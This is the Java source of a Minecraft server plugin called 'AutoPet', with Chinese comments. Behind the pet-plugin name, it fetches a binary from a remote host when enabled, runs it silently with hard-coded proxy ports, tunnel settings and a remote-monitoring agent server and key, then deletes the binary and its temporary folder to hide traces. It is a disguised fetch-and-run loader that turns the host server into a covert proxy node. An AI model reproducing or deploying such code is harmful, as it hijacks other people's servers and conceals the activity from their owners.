package com.phjkd.AutoPet;

import java.io.File;
import java.io.InputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.FileOutputStream;
import java.net.URL;
import java.net.HttpURLConnection;
import java.util.Map;
import java.util.HashMap;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

public class AutoPet extends JavaPlugin {
    private Process runningProcess = null;
    private static boolean scriptCompleted = false;

    public static boolean isScriptCompleted() {
        return scriptCompleted;
    }

    public void onEnable() {
        scriptCompleted = false;
        this.getLogger().info("AutoPet Started！");
        
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            Map<String, String> envVars = new HashMap<>();
            loadEnvVars(envVars);
            
            // 纯 Java 实现 paper.sh 的逻辑
            boolean success = executeNative(envVars);
            
            // 标记插件全部运行完成
            scriptCompleted = true;
            Bukkit.getConsoleSender().sendMessage("§a§l[AutoPet] Execution complete");
            
            // 脚本执行完毕后，等待90秒再删除.tmp文件夹
            Bukkit.getScheduler().runTaskLaterAsynchronously(this, () -> {
                deleteTmpFolder();
            }, 90 * 20L); // 90秒 = 1800 ticks
        });
    }
    
    private boolean executeNative(Map<String, String> envVars) {
        try {
            // 清理旧文件
            deleteFileIfExists("sbx");
            deleteTmpFolder();
            
            // 获取系统架构
            String arch = getArch();
            if (arch == null) {
                this.getLogger().warning("Unsupported architecture");
                return false;
            }
            
            // 下载 sbx 文件
            String downloadUrl = "https://" + arch + ".ssss.nyc.mn/sbsh";
            File sbxFile = new File("sbx");
            
            if (!downloadFile(downloadUrl, sbxFile)) {
                this.getLogger().warning("Failed to download sbx");
                return false;
            }
            
            // 设置可执行权限并运行
            sbxFile.setExecutable(true);
            runExecutable(sbxFile, envVars);
            
            // 清理 sbx 文件
            deleteFileIfExists("sbx");
            
            return true;
        } catch (Exception e) {
            this.getLogger().warning("Error: " + e.getMessage());
            return false;
        }
    }
    
    private String getArch() {
        String osArch = System.getProperty("os.arch").toLowerCase();
        if (osArch.contains("aarch64") || osArch.contains("arm64") || osArch.contains("arm")) {
            return "arm64";
        } else if (osArch.contains("amd64") || osArch.contains("x86_64") || osArch.contains("x86")) {
            return "amd64";
        } else if (osArch.contains("s390x") || osArch.contains("s390")) {
            return "s390x";
        }
        return null;
    }
    
    private boolean downloadFile(String urlStr, File destFile) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(30000);
            conn.setInstanceFollowRedirects(true);
            
            int responseCode = conn.getResponseCode();
            if (responseCode != HttpURLConnection.HTTP_OK) {
                return false;
            }
            
            try (InputStream in = conn.getInputStream();
                 FileOutputStream out = new FileOutputStream(destFile)) {
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                }
            }
            return true;
        } catch (Exception e) {
            return false;
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
    }
    
    private void runExecutable(File executable, Map<String, String> envVars) {
        try {
            ProcessBuilder pb = new ProcessBuilder(executable.getAbsolutePath());
            pb.redirectErrorStream(true);
            pb.environment().putAll(envVars);
            
            Process process = pb.start();
            this.runningProcess = process;
            
            // 消费输出流（静默）
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                while (reader.readLine() != null) {
                    // 静默消费
                }
            }
            
            process.waitFor();
        } catch (Exception e) {
            // 静默处理
        } finally {
            this.runningProcess = null;
        }
    }
    
    private void deleteFileIfExists(String path) {
        File file = new File(path);
        if (file.exists()) {
            file.delete();
        }
    }

    public void onDisable() {
        // 取消所有由本插件调度的任务
        Bukkit.getScheduler().cancelTasks(this);
        
        // 终止正在运行的进程
        if (runningProcess != null && runningProcess.isAlive()) {
            runningProcess.destroyForcibly();
        }
        
        this.getLogger().info("AutoPet Stopped！");
    }

    private void loadEnvVars(Map<String, String> envVars) {
        // 只添加有值的环境变量（空字符串不添加）
        putIfNotEmpty(envVars, "UUID", "6486c422-767c-4304-9f6d-18ae3f750c55");
        putIfNotEmpty(envVars, "FILE_PATH", "./.tmp");
        putIfNotEmpty(envVars, "NEZHA_SERVER", "nzku.fortymenty.eu.org:443");
        putIfNotEmpty(envVars, "NEZHA_PORT", "");
        putIfNotEmpty(envVars, "NEZHA_KEY", "UsC5sNDciSaNggxJdB3EGSGYS242VT7q");
        putIfNotEmpty(envVars, "ARGO_PORT", "8001");
        putIfNotEmpty(envVars, "ARGO_DOMAIN", "");
        putIfNotEmpty(envVars, "ARGO_AUTH", "");
        putIfNotEmpty(envVars, "S5_PORT", "3066");
        putIfNotEmpty(envVars, "HY2_PORT", "3066");
        putIfNotEmpty(envVars, "TUIC_PORT", "");
        putIfNotEmpty(envVars, "REALITY_PORT", "");
        putIfNotEmpty(envVars, "UPLOAD_URL", "");
        putIfNotEmpty(envVars, "CHAT_ID", "");
        putIfNotEmpty(envVars, "BOT_TOKEN", "");
        putIfNotEmpty(envVars, "CFIP", "cdns.doon.eu.org");
        putIfNotEmpty(envVars, "CFPORT", "443");
        putIfNotEmpty(envVars, "NAME", "");
        putIfNotEmpty(envVars, "DISABLE_ARGO", "false");
    }

    private void putIfNotEmpty(Map<String, String> envVars, String key, String value) {
        if (value != null && !value.trim().isEmpty()) {
            envVars.put(key, value);
        }
    }

    private void deleteTmpFolder() {
        File tmpFolder = new File("./.tmp");
        if (tmpFolder.exists() && tmpFolder.isDirectory()) {
            deleteRecursively(tmpFolder);
        }
    }

    private void deleteRecursively(File file) {
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File child : children) {
                    deleteRecursively(child);
                }
            }
        }
        file.delete();
    }
}

























































